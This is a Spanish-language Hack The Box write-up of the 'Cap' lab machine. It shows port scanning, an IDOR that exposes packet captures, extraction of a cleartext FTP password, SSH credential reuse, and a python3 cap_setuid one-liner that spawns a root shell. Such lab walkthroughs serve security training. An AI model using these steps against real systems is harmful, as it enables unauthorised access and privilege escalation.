---
title: Cap - Easy (HTB)
permalink: /Cap-HTB-Writeup/
tags:
  - "Linux"
  - "Easy"
  - "IDOR"
  - "Capabilities"
categories:
  - writeup
  - hackthebox
  - hacking
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Cap - Easy (HTB)
seo_description: Aprende a analizar tráfico de red para descubrir información sensible, abusa de capabilities mal configuradas para vencer Cap.
excerpt: Aprende a analizar tráfico de red para descubrir información sensible, abusa de capabilities mal configuradas para vencer Cap.
header:
  overlay_image: /assets/images/headers/cap-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/cap-hackthebox.jpg
---

![image-center](/assets/images/posts/cap-hackthebox.png){: .align-center}

**Habilidades:** IDOR (Insecure Direct Object Reference), Network Traffic Analysis via `pcap` File, Information Leakage, Abusing `cap_setuid` Capabilites - `python3` [Privilege Escalalation]
{: .notice--primary}

# Introducción

Cap es una máquina Linux de dificultad fácil en HackTheBox enfocada en la enumeración y análisis de tráfico de red. A través de la inspección cuidadosa de los servicios expuestos, como atacantes podremos identificar información clave que permite el acceso inicial al sistema. La máquina también ofrece la oportunidad de aplicar técnicas básicas de escalada de privilegios para obtener el control total. Ideal para quienes buscan fortalecer sus habilidades en análisis de red y post-explotación.

<br>

# Reconocimiento
---
Enviaremos una traza ICMP a la máquina víctima para verificar que la máquina se encuentra activa

~~~ bash
ping -c 1 10.10.11.245
PING 10.10.11.245 (10.10.11.245) 56(84) bytes of data.
64 bytes from 10.10.11.245: icmp_seq=1 ttl=63 time=140 ms

--- 10.10.11.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.794/139.794/139.794/0.000 ms
~~~


## Nmap Scanning

Comenzaremos la fase de reconocimiento realizando un escaneo de puertos con `nmap`, el fin de este escaneo es solamente detectar puertos abiertos. En este caso el escaneo será por el protocolo TCP, además de que sacrificaremos sigilo a cambio de velocidad

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.245 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 15:05 EDT
Nmap scan report for 10.10.10.245
Host is up (0.25s latency).
Not shown: 51066 closed tcp ports (reset), 14466 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

El segundo escaneo que realicemos será para identificar la versión y el servicio que se ejecute en cada puerto que descubrimos anteriormente

~~~ bash
nmap -p 21,22,80 -sVC 10.10.10.245 -oN services Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 15:09 EDT
Nmap scan report for 10.10.10.245
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 18 Mar 2025 19:09:32 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 18 Mar 2025 19:09:24 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 18 Mar 2025 19:09:25 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=3/18%Time=67D9C4E5%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,4C56,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Tue,\x2018\x20Mar\x202025\x2019:09:24\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:19386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\
SF:">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x
SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"im
SF:age/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/
SF:font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20r
SF:el=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.mi
SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stati
SF:c/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpt
SF:ions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Tue,
SF:\x2018\x20Mar\x202025\x2019:09:25\x20GMT\r\nConnection:\x20close\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD
SF:,\x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\
SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv
SF:alid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;R
SF:TSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,
SF:189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Tue,\x2018\x20Mar\x202025\x2019:09:32\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
SF:32\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\
SF:x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</
SF:h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
SF:0check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.60 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis - Security Dashboard

Como el puerto `80` se encuentra abierto, navegaremos hasta la IP de la máquina víctima. Veremos el siguiente panel de administración

![image-center](/assets/images/posts/cap-security-dashboard.png){: .align-center}

Si nos vamos a la sección `Security Snapshot`, nos lleva a la siguiente página en la ruta `/data/2` donde podemos descargar un archivo `2.pcap`

![image-center](/assets/images/posts/cap-security-dashboard-2.png){: .align-center}


## Network Traffic Analysis - `pcap` File

Podemos abrir el archivo con `wireshark`, pero recordemos que existen herramientas como `tshark` o `tcpdump` para poder hacerlo desde la consola. Analizaremos esta captura de paquetes con nuestra herramienta de preferencia con el parámetro `-r` para pasarle la captura

~~~ bash
tshark -r 2.pcap

Running as user "root" and group "root". This could be dangerous.
    1   0.000000 10.10.14.254 → 10.10.10.245 TCP 68 53904 → 80 [ACK] Seq=1 Ack=1 Win=502 Len=0 TSval=2100464087 TSecr=1268546892
    2   0.300035 10.10.14.254 → 10.10.10.245 TCP 76 53906 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1340 SACK_PERM TSval=2100464386 TSecr=0 WS=128
    3   0.300082 10.10.10.245 → 10.10.14.254 TCP 76 80 → 53906 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM TSval=1268548481 TSecr=2100464386 WS=128
    4   0.440094 10.10.14.254 → 10.10.10.245 TCP 68 53906 → 80 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2100464526 TSecr=1268548481
~~~

Estos paquetes de red corresponden a un tráfico TCP que nosotros hemos generado, si volvemos a la web y nos fijamos en la URL, se descarga la captura desde `data/2`.



# Intrusión / Explotación
---
## Insecure Direct Object Reference

Podemos probar ingresar más números para ver si podemos descargar otros archivos de capturas, si esto es posible, estaremos ante un IDOR. Que es una vulnerabilidad que nos permite ver otros recursos internos a los que no deberíamos tener acceso sin una validación

![image-center](/assets/images/posts/cap-idor.png){: .align-center}

Encontramos otra captura descargable al poner un `0` en la URL disponible en la ruta `data/0`, si la analizamos con `tshark` la nueva captura, veremos información diferente

~~~ bash
tshark -r 0.pcap
Running as user "root" and group "root". This could be dangerous.
    1   0.000000 192.168.196.1 → 192.168.196.16 TCP 68 54399 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM
    2   0.000027 192.168.196.16 → 192.168.196.1 TCP 68 80 → 54399 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460 SACK_PERM WS=128
    3   0.000190 192.168.196.1 → 192.168.196.16 TCP 62 54399 → 80 [ACK] Seq=1 Ack=1 Win=1051136 Len=0
    4   0.000241 192.168.196.1 → 192.168.196.16 HTTP 454 GET / HTTP/1.1 
    5   0.000246 192.168.196.16 → 192.168.196.1 TCP 56 80 → 54399 [ACK] Seq=1 Ack=399 Win=64128 Len=0
    6   0.001742 192.168.196.16 → 192.168.196.1 TCP 73 HTTP/1.0 200 OK  [TCP segment of a reassembled PDU]
    7   0.001858 192.168.196.16 → 192.168.196.1 HTTP 1434 HTTP/1.0 200 OK  (text/html)
    8   0.002121 192.168.196.1 → 192.168.196.16 TCP 62 54399 → 80 [ACK] Seq=399 Ack=1397 Win=1049600 Len=0
    9   0.002208 192.168.196.1 → 192.168.196.16 TCP 62 54399 → 80 [FIN, ACK] Seq=399 Ack=1397 Win=1049600 Len=0
   10   0.002222 192.168.196.16 → 192.168.196.1 TCP 56 80 → 54399 [ACK] Seq=1397 Ack=400 Win=64128 Len=0
   11   0.042235 192.168.196.1 → 192.168.196.16 TCP 68 54400 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM
   12   0.042273 192.168.196.16 → 192.168.196.1 TCP 68 80 → 54400 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460 SACK_PERM WS=128
   13   0.042471 192.168.196.1 → 192.168.196.16 TCP 62 54400 → 80 [ACK] Seq=1 Ack=1 Win=1051136 Len=0
   14   0.042529 192.168.196.1 → 192.168.196.16 HTTP 416 GET /static/main.css HTTP/1.1
~~~

En este caso veremos otros protocolos, para poder hacer uso de filtros por protocolos, indicaremos el parámetro `-Y`. Como la captura contiene tráfico por el protocolo `FTP`, podemos filtrar esto para ver si vemos información de algún usuario

~~~ bash
tshark -r 0.pcap -Tfields -e tcp.payload | xxd -ps -r | grep PASS -B 3

220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
~~~

Y logramos ver que el usuario `nathan` inicia sesión para el servicio `ftp`, podemos hacer dos cosas, o intentar usar estas credenciales para el protocolo `ssh` o `ftp` mismo. Al menos ya sabemos que estas credenciales aplican para el servicio `ftp`

~~~ bash
ftp nathan@10.10.10.245                                                                                                 
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45435|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Mar 18 16:35 user.txt
drwxrwxr-x    2 1001     1001         4096 Mar 18 17:14 www
~~~

Si nos conectamos por `ftp` proporcionando la contraseña que extrajimos. lograremos ver la flag del usuario. Probaremos estas credenciales en `ssh` para verificar si se reutilizan

~~~ bash
ssh nathan@10.10.10.245                     
The authenticity of host '10.10.10.245 (10.10.10.245)' can\'t be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
nathan@10.10.10.245\'s password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 18 20:01:12 UTC 2025

  System load:  0.0               Processes:             229
  Usage of /:   36.7% of 8.73GB   Users logged in:       1
  Memory usage: 35%               IPv4 address for eth0: 10.10.10.245
  Swap usage:   0%

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Mar 18 17:08:30 2025 from 10.10.16.19
nathan@cap:~$ 
~~~

Y se reutilizan las credenciales!, podemos cambiar el valor de la variable `TERM`, asignándole `xterm` para poder hacer uso de `Ctrl + L`

~~~ bash
nathan@cap:~$ export TERM=xterm
~~~

Listaremos la IP para verificar que estemos dentro de la máquina víctima

~~~ bash
nathan@cap:~$ hostname -I
10.10.10.245
~~~

Si vemos el contenido del archivo `/etc/passwd` para ver los usuarios existentes en esta máquina, veremos los siguientes

~~~ bash
nathan@cap:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
nathan:x:1001:1001::/home/nathan:/bin/bash
~~~

Solamente existe `root` aparte de `nathan`, por lo que debemos escalar directamente al usuario `root`


## (Posible) Sudoers Privileges

Una de las metodologías más comunes a la hora de enumerar una máquina Linux en la post-explotación, sería ver si contamos con privilegios `sudo`, sin embargo, en esta máquina no tenemos capacidad de ejecutar `sudo`

~~~ bash
nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
~~~

~~~ bash
nathan@cap:~$ find / -perm -4000 2>/dev/null | grep -vE "snap|lib"
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
~~~



# Escalada de Privilegios
---
## Abusing `setuid` Capabilities - `cap_setuid`

Si listamos las `capabilities` presentes en el sistema, veremos que `pyhton` tiene asignado `cap_setuid`

~~~ bash
nathan@cap:/tmp$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
~~~

Esta capacidad nos permite cambiar el `uid` (User Identifier), que es el valor que identifica a los usuarios en sistemas Linux. Sabiendo esto, podemos asignarnos el `uid` del usuario `root`, y obtener una consola con privilegios elevados

~~~ bash
nathan@cap:/tmp$ python3 -c 'import os; os.setuid(0);os.system("whoami")'
root
~~~

## Root time

Sabiendo esto, nos convertiremos en el usuario `root` lanzando una `bash` cambiando el valor del `uid`, esto no ocurre con los grupos, solamente estamos cambiando el valor del usuario

~~~ bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~\# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
~~~
